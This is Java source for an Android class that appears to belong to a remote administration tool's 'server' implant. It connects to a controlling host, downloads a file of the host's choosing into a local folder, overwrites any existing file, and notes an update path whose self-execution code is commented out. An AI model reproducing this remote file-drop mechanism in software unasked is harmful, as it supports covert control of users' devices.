package com.qooport.android.servidor;
import android.util.Log;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;
import com.qooport.android.Servicio;
import com.qooport.android.utilidades.Protocolo;
import com.qooport.android.utilidades.cifrado.Encriptacion;
public class RecibirArchivo
        extends Thread {
    private Servicio conexion;
    private ObjectOutputStream out;
    private ObjectInputStream in;
    private String archivoaRecibir;
    private String ruta;
    private boolean actualizacion;
    public RecibirArchivo(String archivo, String ruta, Servicio conex) {
        this.archivoaRecibir = archivo;
        this.conexion = conex;
        this.ruta = ruta;
        actualizacion = false;
    }
    public RecibirArchivo(String archivo, String ruta, boolean actualizacion, Servicio conex) {
        this.archivoaRecibir = archivo;
        this.conexion = conex;
        this.actualizacion = actualizacion;
        this.ruta = ruta;
    }
    @Override
    public void run() {
        try {
            Log.i("info", "inicio recepcion del archivo");
            Socket socket = new Socket(conexion.getHost(), (conexion.getPuertoTransferencias()));
            out = new ObjectOutputStream(socket.getOutputStream());
            in = new ObjectInputStream(socket.getInputStream());
            out.writeInt(Protocolo.subir);
            out.flush();
            out.writeObject(Encriptacion.cifra(archivoaRecibir));
            out.flush();
            String nombre = Servicio.leerCadena((byte[]) in.readObject());
            File carpeta = new File(ruta);
            File archivo = new File(carpeta, nombre);
            if (archivo.exists()) {
                archivo.delete();
            }
            FileOutputStream escribirArchivo = new FileOutputStream(archivo);
            byte[] buf = new byte[1024];
            long descargado = 0L;
            long tam = in.readLong();
            int i;
//            while (((i = in.read(buf)) > -1)) {//            
            while (descargado < tam) {
                i = this.in.read(buf);
                descargado += i;
                escribirArchivo.write(buf, 0, i);
            }
//            System.out.println("Termine de recibir el archivo");
            escribirArchivo.close();
            in.close();
            out.close();
            //si es una actualizacion ejecuta al servidor
            if (actualizacion) {
                conexion.enviarMensaje("ES UNA ACTUALIZACON VOY A INTENTAR EJECUTAR AL SERVIDOR");
//                try {
//                    Desktop.getDesktop().open(archivo.getAbsoluteFile());
//                    System.exit(0); //teminamos
//                } catch (IOException e) {
//                    conexion.enviarMensaje("Error al abrir al servidor " + e.getMessage());
//                }
            } else {
                conexion.enviarMensaje("NO ES ACTUALIZACION");
            }
        } catch (IOException ex) {
//            System.out.println("error al recibir " + ex.getMessage());
        } catch (ClassNotFoundException ex) {
            Logger.getLogger(RecibirArchivo.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
}
